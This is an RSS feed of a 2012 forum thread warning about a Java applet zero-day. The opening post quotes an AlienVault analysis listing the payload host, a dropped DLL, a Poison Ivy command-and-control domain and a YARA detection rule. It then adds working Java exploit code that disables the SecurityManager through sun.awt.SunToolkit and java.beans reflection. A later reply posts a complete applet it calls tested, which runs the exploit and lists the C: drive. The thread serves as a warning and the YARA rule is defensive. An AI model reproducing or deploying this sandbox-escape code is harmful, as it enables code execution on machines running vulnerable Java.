<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Java 0 day exploit - disable java applet runtime now</title>
    <link>https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941</link>
    <description>http://labs.alienvault.com/labs/index.php/2012/new-java-0day-exploited-in-the-wild/

&lt;blockquote&gt;The html loads the Java applet passing some parameters that are used later to build the URL to download the payload. The HTML is encrypted using “Dadong’s JSXX 0.44 VIP”.

[img]http://labs.alienvault.com/labs/wp-content/uploads/2012/08/Screen-shot-2012-08-27-at-2.33.32-AM1.png[/img] 

The Java applet contains the following two .class files:

- cve2012xxxx/Gondzz.class

- cve2012xxxx/Gondvv.class

The applet check if the system is running Windows and gets the parameters passed from the HTML that contains the URL to download the payload. If the system is vulnerable, the payload is downloaded and executed in the system.

[img]http://labs.alienvault.com/labs/wp-content/uploads/2012/08/Screen-shot-2012-08-27-at-2.39.32-AM.png[/img]
[img]http://labs.alienvault.com/labs/wp-content/uploads/2012/08/Screen-shot-2012-08-27-at-2.40.01-AM.png[/img]
On the analyzed sample the payload is downloaded from ok.aa24.net / meeting / hi.exe

https://www.virustotal.com/file/09d10ae0f763e91982e1c276aad0b26a575840ad986b8f53553a4ea0a948200f/analysis/1346055031/

The payload drops C:\WINDOWS\system32\mspmsnsv.dll (replace the file if present) and starts the Portable Media Serial Number Service.

The malware connects to hello.icon.pk port 80. It seems to be a Poison Ivy variant.

hello.icon.pk resolvs to:

223.25.233.244

223.25.233.0 – 223.25.233.255
8 to Infinity Pte Ltd

You can use the following generic Yara rule to detect a malicious .class file exploiting this vulnerability:

rule Java0daycve2012xxxx_generic
{
  meta:
     weight=100
     author = “Jaime Blasco”
     source = “alienvault”
     date = “2012-08″
  strings:
        $ =  ”java/security/ProtectionDomain”
        $ = “java/security/Permissions”
        $ = “java/security/cert/Certificate”
        $ = “setSecurityManager”
        $ = “file:///”
        $ = “sun.awt.SunToolkit”
        $ = “getField”
  condition:
    all of them
}
A module has just been published for Metasploit so it is time to disable Java in all your systems

And remember to search your logs for connections to the Domains/IPs related to this attack.&lt;/blockquote&gt;

example exploit code to disable security through applet:
[code=java]public static void disable() throws Throwable {
		Class&lt;?&gt; sun_awt_SunToolkit = ClassFinder.findClass(&quot;sun.awt.SunToolkit&quot;);
		Expression expression = new Expression(sun_awt_SunToolkit, &quot;getField&quot;, new Object[] { Statement.class, &quot;acc&quot; });
		expression.execute();
		Field acc_Field = ((Field) expression.getValue());
		Permissions allPermissons = new Permissions();
		allPermissons.add(new AllPermission());
		AccessControlContext ap_accessControlContext = new AccessControlContext(new ProtectionDomain[] {
				new ProtectionDomain(new CodeSource(new URL(&quot;file:///&quot;), new Certificate[0]), allPermissons)
		});
		Statement disableSecurityManager = new Statement(java.lang.System.class, &quot;setSecurityManager&quot;, new Object[1]);
		acc_Field.set(disableSecurityManager, ap_accessControlContext );
		disableSecurityManager.execute();
	}[/code]

test it by putting it into an applet and calling:
[code]disable();
for (File file : new File(&quot;C:/&quot;).listFiles())
    System.out.println(&quot;\t&quot; + file);
[/code]</description>
    
    <lastBuildDate>Sun, 18 Nov 2012 06:54:00 +0000</lastBuildDate>
    <category>General Discussion</category>
    <atom:link href="https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Java 0 day exploit - disable java applet runtime now</title>
        <dc:creator><![CDATA[@moparisthebest Moparisthebest]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/moparisthebest">@moparisthebest</a> wrote:</p>
          <blockquote>
              <p>[quote=“Pwnd, post:6, topic:456941”][quote author=t4 link=topic=559882.msg4089293#msg4089293 date=1346176135]<br>
couldn’t you just set your browser to warn and not execute applets unless given permission? i’m pretty sure chrome has this feature.<br>
[/quote]I thought it was a Java feature…  Unless that’s just for signed.[/quote]</p>
<p>It’s just for signed.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941/9">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941/9</link>
        <pubDate>Sun, 18 Nov 2012 06:54:00 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-456941-9</guid>
        <source url="https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941.rss">Java 0 day exploit - disable java applet runtime now</source>
      </item>
      <item>
        <title>Java 0 day exploit - disable java applet runtime now</title>
        <dc:creator><![CDATA[@Ruby_Forums_Coder Ruby]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/ruby_forums_coder">@Ruby_Forums_Coder</a> wrote:</p>
          <blockquote>
              <p>[quote=“Whackatre, post:7, topic:456941”]Was I the only individual who laughed hysterically at the Chinese pinyin?</p>
<p>woyouyizhixiaomao</p>
<p>“I have a small cat.”  :rolleyes:  :P[/quote]I think it’s only you and silab that can speak Chinese, lol.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941/8">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941/8</link>
        <pubDate>Sat, 15 Sep 2012 09:24:37 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-456941-8</guid>
        <source url="https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941.rss">Java 0 day exploit - disable java applet runtime now</source>
      </item>
      <item>
        <title>Java 0 day exploit - disable java applet runtime now</title>
        <dc:creator><![CDATA[@whackatre Whackatre]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/whackatre">@whackatre</a> wrote:</p>
          <blockquote>
              <p>Was I the only individual who laughed hysterically at the Chinese pinyin?</p>
<p>woyouyizhixiaomao</p>
<p>“I have a small cat.”  :rolleyes:  <img src="https://forum.moparisthebest.com/images/emoji/twitter/stuck_out_tongue.png?v=5" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941/7">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941/7</link>
        <pubDate>Fri, 14 Sep 2012 15:19:00 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-456941-7</guid>
        <source url="https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941.rss">Java 0 day exploit - disable java applet runtime now</source>
      </item>
      <item>
        <title>Java 0 day exploit - disable java applet runtime now</title>
        <dc:creator><![CDATA[@Pwnd Pwnd]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/pwnd">@Pwnd</a> wrote:</p>
          <blockquote>
              <p>[quote=“t4, post:2, topic:456941”]couldn’t you just set your browser to warn and not execute applets unless given permission? i’m pretty sure chrome has this feature.[/quote]I thought it was a Java feature…  Unless that’s just for signed.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941/6">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941/6</link>
        <pubDate>Fri, 14 Sep 2012 06:15:26 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-456941-6</guid>
        <source url="https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941.rss">Java 0 day exploit - disable java applet runtime now</source>
      </item>
      <item>
        <title>Java 0 day exploit - disable java applet runtime now</title>
        <dc:creator><![CDATA[@JavaTC JavaTC]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/javatc">@JavaTC</a> wrote:</p>
          <blockquote>
              <p>Good find</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941/5">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941/5</link>
        <pubDate>Wed, 12 Sep 2012 17:47:27 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-456941-5</guid>
        <source url="https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941.rss">Java 0 day exploit - disable java applet runtime now</source>
      </item>
      <item>
        <title>Java 0 day exploit - disable java applet runtime now</title>
        <dc:creator><![CDATA[@nueb35 Nueb35]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/nueb35">@nueb35</a> wrote:</p>
          <blockquote>
              <p>Tested:</p>
<p>[code=java]import java.applet.Applet;<br>
import java.beans.Expression;<br>
import java.beans.Statement;<br>
import java.io.File;<br>
import java.lang.reflect.Field;<br>
import java.net.URL;<br>
import java.security.AccessControlContext;<br>
import java.security.AllPermission;<br>
import java.security.CodeSource;<br>
import java.security.Permissions;<br>
import java.security.ProtectionDomain;<br>
import java.security.cert.Certificate;</p>
<p>import javax.swing.JOptionPane;</p>
<p>public class Test extends Applet<br>
{<br>
private static final long serialVersionUID = 1L;</p>
<pre><code>public static void doDisable() throws Throwable
{
	Expression expression = new Expression(Class.class, "forName", new Object[] { "sun.awt.SunToolkit" });
	expression.execute();
	
	Class&lt;?&gt; sun_awt_SunToolkit = (Class&lt;?&gt;) expression.getValue();
	expression = new Expression(sun_awt_SunToolkit, "getField", new Object[] { Statement.class, "acc" });
	expression.execute();
	
	Field acc_Field = ((Field) expression.getValue());
	Permissions allPermissons = new Permissions();
	allPermissons.add(new AllPermission());
	AccessControlContext ap_accessControlContext = new AccessControlContext(new ProtectionDomain[] { new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), allPermissons) });
	Statement disableSecurityManager = new Statement(java.lang.System.class, "setSecurityManager", new Object[1]);
	acc_Field.set(disableSecurityManager, ap_accessControlContext);
	disableSecurityManager.execute();
}

public void start()
{
	String str = "";
	try
	{
		doDisable();
	}
	catch (Throwable e)
	{
		e.printStackTrace();
	}
	
	for (File file : new File("C:/").listFiles())
	    str += "\n" + file;

	JOptionPane.showMessageDialog(null, str);
}
</code></pre>
<p>}<br>
[/code]</p>
<p>This is so exciting, I’ve never known about a 0 day before it was patched.</p>
<p>also: <span class="mention">@t4</span>, chrome does block applets from starting</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941/4">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941/4</link>
        <pubDate>Wed, 29 Aug 2012 00:24:49 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-456941-4</guid>
        <source url="https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941.rss">Java 0 day exploit - disable java applet runtime now</source>
      </item>
      <item>
        <title>Java 0 day exploit - disable java applet runtime now</title>
        <dc:creator><![CDATA[@slavemaster veer]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/slavemaster">@slavemaster</a> wrote:</p>
          <blockquote>
              <p>That’s pretty clever using java.beans like that :-p I didn’t even realize that API was available in SE.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941/3">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941/3</link>
        <pubDate>Tue, 28 Aug 2012 17:59:34 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-456941-3</guid>
        <source url="https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941.rss">Java 0 day exploit - disable java applet runtime now</source>
      </item>
      <item>
        <title>Java 0 day exploit - disable java applet runtime now</title>
        <dc:creator><![CDATA[@T41 t4]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/t41">@T41</a> wrote:</p>
          <blockquote>
              <p>couldn’t you just set your browser to warn and not execute applets unless given permission? i’m pretty sure chrome has this feature.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941/2">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941/2</link>
        <pubDate>Tue, 28 Aug 2012 17:48:55 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-456941-2</guid>
        <source url="https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941.rss">Java 0 day exploit - disable java applet runtime now</source>
      </item>
      <item>
        <title>Java 0 day exploit - disable java applet runtime now</title>
        <dc:creator><![CDATA[@Ollie Ollie]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/ollie">@Ollie</a> wrote:</p>
          <blockquote>
              <p><a href="http://labs.alienvault.com/labs/index.php/2012/new-java-0day-exploited-in-the-wild/" class="onebox" target="_blank" rel="nofollow noopener">http://labs.alienvault.com/labs/index.php/2012/new-java-0day-exploited-in-the-wild/</a></p>
<blockquote>The html loads the Java applet passing some parameters that are used later to build the URL to download the payload. The HTML is encrypted using “Dadong’s JSXX 0.44 VIP”.
<p><img src="http://labs.alienvault.com/labs/wp-content/uploads/2012/08/Screen-shot-2012-08-27-at-2.33.32-AM1.png" alt width="" height=""></p>
<p>The Java applet contains the following two .class files:</p>
<ul>
<li>
<p>cve2012xxxx/Gondzz.class</p>
</li>
<li>
<p>cve2012xxxx/Gondvv.class</p>
</li>
</ul>
<p>The applet check if the system is running Windows and gets the parameters passed from the HTML that contains the URL to download the payload. If the system is vulnerable, the payload is downloaded and executed in the system.</p>
<p><img src="http://labs.alienvault.com/labs/wp-content/uploads/2012/08/Screen-shot-2012-08-27-at-2.39.32-AM.png" alt width="" height=""><br>
<img src="http://labs.alienvault.com/labs/wp-content/uploads/2012/08/Screen-shot-2012-08-27-at-2.40.01-AM.png" alt width="" height=""><br>
On the analyzed sample the payload is downloaded from <a href="http://ok.aa24.net" rel="nofollow noopener">ok.aa24.net</a> / meeting / hi.exe</p>
<p><a href="https://www.virustotal.com/file/09d10ae0f763e91982e1c276aad0b26a575840ad986b8f53553a4ea0a948200f/analysis/1346055031/" class="onebox" target="_blank" rel="nofollow noopener">https://www.virustotal.com/file/09d10ae0f763e91982e1c276aad0b26a575840ad986b8f53553a4ea0a948200f/analysis/1346055031/</a></p>
<p>The payload drops C:\WINDOWS\system32\mspmsnsv.dll (replace the file if present) and starts the Portable Media Serial Number Service.</p>
<p>The malware connects to hello.icon.pk port 80. It seems to be a Poison Ivy variant.</p>
<p>hello.icon.pk resolvs to:</p>
<p>223.25.233.244</p>
<p>223.25.233.0 – 223.25.233.255<br>
8 to Infinity Pte Ltd</p>
<p>You can use the following generic Yara rule to detect a malicious .class file exploiting this vulnerability:</p>
<p>rule Java0daycve2012xxxx_generic<br>
{<br>
meta:<br>
weight=100<br>
author = “Jaime Blasco”<br>
source = “alienvault”<br>
date = “2012-08″<br>
strings:<br>
$ =  ”java/security/ProtectionDomain”<br>
$ = “java/security/Permissions”<br>
$ = “java/security/cert/Certificate”<br>
$ = “setSecurityManager”<br>
$ = “file:///”<br>
$ = “sun.awt.SunToolkit”<br>
$ = “getField”<br>
condition:<br>
all of them<br>
}<br>
A module has just been published for Metasploit so it is time to disable Java in all your systems</p>
<p>And remember to search your logs for connections to the Domains/IPs related to this attack.</p>
</blockquote>
<p>example exploit code to disable security through applet:</p>
<p><code>public static void disable() throws Throwable {
		Class&lt;?&gt; sun_awt_SunToolkit = ClassFinder.findClass("sun.awt.SunToolkit");
		Expression expression = new Expression(sun_awt_SunToolkit, "getField", new Object[] { Statement.class, "acc" });
		expression.execute();
		Field acc_Field = ((Field) expression.getValue());
		Permissions allPermissons = new Permissions();
		allPermissons.add(new AllPermission());
		AccessControlContext ap_accessControlContext = new AccessControlContext(new ProtectionDomain[] {
				new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), allPermissons)
		});
		Statement disableSecurityManager = new Statement(java.lang.System.class, "setSecurityManager", new Object[1]);
		acc_Field.set(disableSecurityManager, ap_accessControlContext );
		disableSecurityManager.execute();
	}</code></p>
<p>test it by putting it into an applet and calling:</p>
<p><code>disable();
for (File file : new File("C:/").listFiles())
    System.out.println("\t" + file);
</code></p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941/1">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941/1</link>
        <pubDate>Tue, 28 Aug 2012 17:32:22 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-456941-1</guid>
        <source url="https://forum.moparisthebest.com/t/java-0-day-exploit-disable-java-applet-runtime-now/456941.rss">Java 0 day exploit - disable java applet runtime now</source>
      </item>
  </channel>
</rss>
